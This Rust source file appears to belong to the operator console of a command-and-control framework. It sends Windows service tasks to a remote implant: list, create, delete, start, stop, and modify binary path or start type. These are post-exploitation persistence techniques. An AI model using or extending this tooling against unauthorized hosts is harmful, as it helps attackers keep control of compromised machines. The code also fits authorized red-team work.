//! Windows service management commands

use anyhow::Result;
use common::ImplantId;
use prost::Message;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// List all services on the implant host
pub async fn list(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Listing services...");
    let task = protocol::ServiceTask {
        operation: Some(protocol::service_task::Operation::List(protocol::SvcList {
            name_filter: None,
            running_only: None,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "svc", task_data).await?;
    print_success(&format!("Service list task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}

/// Query the status and configuration of a named service
pub async fn query(cli: &CliState, name: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Querying service: {}", name));
    let task = protocol::ServiceTask {
        operation: Some(protocol::service_task::Operation::Query(protocol::SvcQuery {
            name: name.to_string(),
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "svc", task_data).await?;
    print_success(&format!("Service query task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}

/// Create a new service with the given name pointing to the specified binary path
pub async fn create(cli: &CliState, name: &str, binary_path: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Creating service '{}' -> {}", name, binary_path));
    let task = protocol::ServiceTask {
        operation: Some(protocol::service_task::Operation::Create(protocol::SvcCreate {
            name: name.to_string(),
            display_name: name.to_string(),
            binary_path: binary_path.to_string(),
            description: None,
            start_type: None,
            account: None,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "svc", task_data).await?;
    print_success(&format!("Service create task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Delete the named service from the service control manager
pub async fn delete(cli: &CliState, name: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Deleting service: {}", name));
    let task = protocol::ServiceTask {
        operation: Some(protocol::service_task::Operation::Delete(protocol::SvcDelete {
            name: name.to_string(),
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "svc", task_data).await?;
    print_success(&format!("Service delete task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Start the named service
pub async fn start(cli: &CliState, name: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Starting service: {}", name));
    let task = protocol::ServiceTask {
        operation: Some(protocol::service_task::Operation::Start(protocol::SvcStart {
            name: name.to_string(),
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "svc", task_data).await?;
    print_success(&format!("Service start task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Stop the named service
pub async fn stop(cli: &CliState, name: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Stopping service: {}", name));
    let task = protocol::ServiceTask {
        operation: Some(protocol::service_task::Operation::Stop(protocol::SvcStop {
            name: name.to_string(),
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "svc", task_data).await?;
    print_success(&format!("Service stop task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Modify a configuration field of the named service (e.g. binpath, start, displayname)
pub async fn modify(cli: &CliState, name: &str, field: &str, value: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Modifying service '{}': {} = {}", name, field, value));
    let task = protocol::ServiceTask {
        operation: Some(protocol::service_task::Operation::Modify(protocol::SvcModify {
            name: name.to_string(),
            binary_path: if field == "binpath" { Some(value.to_string()) } else { None },
            start_type: if field == "start" { value.parse().ok() } else { None },
            description: if field == "description" { Some(value.to_string()) } else { None },
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "svc", task_data).await?;
    print_success(&format!("Service modify task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}
